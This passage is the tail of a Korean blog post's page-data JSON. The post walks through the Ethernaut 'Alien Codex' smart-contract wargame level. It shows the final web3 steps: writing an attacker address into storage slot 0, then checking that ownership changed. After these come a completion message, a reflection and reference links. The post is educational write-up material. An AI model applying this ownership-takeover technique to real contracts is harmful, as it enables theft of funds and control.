punctuation\">,</span><span class=\"token string\">\"0x0000000000000000000000000d3D56806fe6eeDe410Ea9722da9a6f65FD24799\"</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token comment\">// owner이 잘 바뀐지 확인</span>\r\n<span class=\"token keyword\">await</span> web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span><span class=\"token function\">getStorageAt</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"contract address\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre></div>\n<br/>\n<p>owner가 바뀐것을 확인했다면 ethernaut으로 돌아와 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!</code></pre></div>\n<hr>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>ethernaut은 후반부에 갈수록 배우는 것이 많다고 생각한다. 이 magicNumber와 마찬가지로 이번 문제에서도 EVM에 대해 더 깊이 알 수 있었던 시간이었다. 또한 underhand solidity contest에 대해서도 알게되었다. 이제 ethernaut 문제가 6개 남았는데, 문제를 다 풀고나면 underhand solidity contest문제들도 풀어보며 열심히 배우자 :)</p>\n<hr>\n<h2 id=\"ref\" style=\"position:relative;\"><a href=\"#ref\" aria-label=\"ref permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>REF</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>remix IDE: <a href=\"https://remix.ethereum.org\">https://remix.ethereum.org</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">승리 조건</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">코드 분석</a></p>\n</li>\n<li>\n<p><a href=\"#%ED%92%80%EC%9D%B4\">풀이</a></p>\n<ul>\n<li><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0-%EC%A0%84\">들어가기 전</a></li>\n<li><a href=\"#%ED%92%80%EC%9D%B4-1\">풀이</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">마무리</a></p>\n</li>\n<li>\n<p><a href=\"#ref\">REF</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"February 05, 2022","title":"(Ethernaut 취약점 19) Alien Codex","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/ethernaut/19_alienCodex_ethernaut/19_alienCodex_ethernaut/"}},"prev":null,"site":{"siteMetadata":{"siteUrl":"https://holyhansss.github.io","comments":{"utterances":{"repo":""}}}}},"pageContext":{"slug":"/allSeries/","nextSlug":"/ethernaut/19_alienCodex_ethernaut/19_alienCodex_ethernaut/","prevSlug":""}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}